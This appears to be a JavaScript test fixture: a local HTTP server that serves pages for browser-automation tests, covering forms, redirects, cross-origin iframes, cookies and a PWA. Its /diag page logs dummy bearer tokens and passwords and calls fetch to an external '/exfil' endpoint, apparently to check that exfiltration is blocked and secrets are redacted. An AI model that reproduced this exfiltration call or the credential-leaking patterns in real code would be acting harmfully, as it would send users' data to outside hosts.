import { createServer } from "node:http";

/**
 * Local fixture site for browser-worker tests. Two instances are started in
 * tests: site A (the session's allowed origin) and site B (a second loopback
 * origin used as the "external" party for cross-origin, redirect and
 * external-write fixtures).
 */
export function startSite({ externalBase = "http://external.invalid" } = {}) {
  const server = createServer((req, res) => {
    const url = new URL(req.url ?? "/", "http://localhost");
    const path = url.pathname;
    const send = (status, body, headers = {}) => {
      res.writeHead(status, { "content-type": "text/html; charset=utf-8", ...headers });
      res.end(body);
    };

    if (path === "/") {
      send(
        200,
        `<h1>Fixture home</h1>
         <a href="/form">form</a> <a href="/moving">moving</a> <a href="/canvas">canvas</a>
         <a href="/tall">tall</a> <a href="/redirect">redirect</a> <a href="/crossorigin">crossorigin</a>
         <a href="/delayed">delayed</a> <a href="/external-form">external-form</a>
         <a href="/external-link">external-link</a>`,
      );
      return;
    }

    if (path === "/form") {
      send(
        200,
        `<h1>Form</h1>
         <form action="/submitted" method="get">
           <input id="note" name="note" placeholder="note" />
           <select id="color" name="color"><option value="red">Red</option><option value="blue">Blue</option></select>
           <button id="dup1" name="which" value="1">Submit</button>
           <button id="dup2" name="which" value="2">Submit</button>
         </form>
         <button id="local" onclick="location.href='/submitted'">Send local</button>`,
      );
      return;
    }

    if (path === "/submitted") {
      send(200, `<h1>Submitted</h1><div id="done">complete</div>`);
      return;
    }

    if (path === "/moving") {
      send(
        200,
        `<h1>Moving</h1>
         <button id="move" style="position:absolute">Move me</button>
         <script>
           let i = 0;
           setInterval(() => {
             const el = document.getElementById('move');
             el.style.left = (50 + (i * 37) % 300) + 'px';
             el.style.top = (40 + (i * 53) % 200) + 'px';
             i += 1;
           }, 50);
         </script>`,
      );
      return;
    }

    if (path === "/canvas") {
      send(
        200,
        `<h1>Canvas</h1>
         <canvas id="c" width="300" height="200" style="border:1px solid #000"></canvas>
         <script>
           const c = document.getElementById('c');
           c.addEventListener('click', (e) => {
             const r = c.getBoundingClientRect();
             (window.__clicks ||= []).push({ x: e.clientX - r.left, y: e.clientY - r.top });
           });
         </script>`,
      );
      return;
    }

    if (path === "/tall") {
      send(
        200,
        `<h1>Tall</h1><div style="height:3000px">tall section</div>
         <button id="bottom">Bottom action</button>`,
      );
      return;
    }

    if (path === "/redirect") {
      res.writeHead(302, { location: `${externalBase}/landing` });
      res.end();
      return;
    }

    if (path === "/landing") {
      send(200, `<h1>Landing</h1>`);
      return;
    }

    if (path === "/crossorigin") {
      send(
        200,
        `<h1>Host</h1><iframe id="ext" src="${externalBase}/frame-content" width="400" height="200"></iframe>`,
      );
      return;
    }

    if (path === "/frame-content") {
      send(200, `<button id="frame-btn">Frame button</button>`);
      return;
    }

    if (path === "/external-form") {
      send(
        200,
        `<h1>External form</h1>
         <form action="${externalBase}/collect" method="post">
           <input name="report" placeholder="report" />
           <button id="send-report" type="submit">Send report</button>
         </form>`,
      );
      return;
    }

    if (path === "/external-link") {
      send(200, `<h1>Links</h1><a href="${externalBase}/landing">Visit external</a>`);
      return;
    }

    if (path === "/collect" && req.method === "POST") {
      send(200, `<h1>Collected</h1><div id="collected">ok</div>`);
      return;
    }

    if (path === "/cookie/set") {
      const name = url.searchParams.get("name") ?? "sid";
      const value = url.searchParams.get("value") ?? "v";
      send(200, "cookie set", { "set-cookie": `${name}=${value}; Path=/` });
      return;
    }

    if (path === "/cookie/get") {
      res.writeHead(200, { "content-type": "application/json" });
      res.end(JSON.stringify({ cookie: req.headers.cookie ?? "" }));
      return;
    }

    if (path === "/diag") {
      send(
        200,
        `<h1>Diag</h1><button id="go">go</button>
         <script>
           console.log("loaded with Bearer abcdef1234567890abcdef and password=hunter2");
           document.getElementById("go").onclick = () => {
             fetch("/api/ping?token=SUPERSECRET&page=1", { headers: { authorization: "Bearer SUPERSECRETBEARER" } });
             fetch("${externalBase}/exfil?data=1").catch(() => console.error("exfil blocked"));
           };
         </script>`,
        { "set-cookie": "sid=COOKIESECRET; Path=/" },
      );
      return;
    }

    if (path === "/api/ping") {
      res.writeHead(200, { "content-type": "application/json", "set-cookie": "api=APISECRET; Path=/", "x-secret": "HDRSECRET" });
      res.end("{}");
      return;
    }

    if (path === "/pwa") {
      send(200, `<!doctype html><meta name="viewport" content="width=device-width"><link rel="manifest" href="/manifest.webmanifest"><h1 id="t">PWA</h1><button id="tap">Tap me</button>
        <div id="count">0</div><script>document.getElementById("tap").addEventListener("click",()=>{count.textContent=String(+count.textContent+1)});navigator.serviceWorker&&navigator.serviceWorker.register("/sw.js")</script>`);
      return;
    }
    if (path === "/manifest.webmanifest") {
      res.writeHead(200, { "content-type": "application/manifest+json" });
      res.end(JSON.stringify({ name: "Fixture PWA", short_name: "Fx", display: "standalone", start_url: "/pwa", icons: [{ src: "/i.png", sizes: "192x192" }] }));
      return;
    }
    if (path === "/sw.js") {
      res.writeHead(200, { "content-type": "text/javascript" });
      res.end("self.addEventListener('fetch',()=>{});");
      return;
    }

    if (path === "/visual") {
      const color = url.searchParams.get("color") ?? "#1a73e8";
      send(200, `<style>body{margin:0;font:16px sans-serif}.box{width:200px;height:100px;background:${color};margin:20px}#clock{position:absolute;top:5px;right:5px}.spin{animation:s 1s infinite}@keyframes s{to{transform:translateX(50px)}}</style>
        <div class="box spin"></div><h1>Visual</h1><div id="clock">${Date.now()}</div>`);
      return;
    }

    if (path === "/delayed") {
      send(
        200,
        `<h1>Delayed</h1>
         <script>setTimeout(() => { const d = document.createElement('div'); d.id = 'later'; d.textContent = 'ready'; document.body.appendChild(d); }, 250);</script>`,
      );
      return;
    }

    send(404, "<h1>not found</h1>");
  });

  return new Promise((resolve) => {
    server.listen(0, "127.0.0.1", () => {
      const address = server.address();
      const port = typeof address === "object" && address ? address.port : 0;
      resolve({
        origin: `http://127.0.0.1:${port}`,
        port,
        close: () => new Promise((r) => server.close(() => r(undefined))),
      });
    });
  });
}
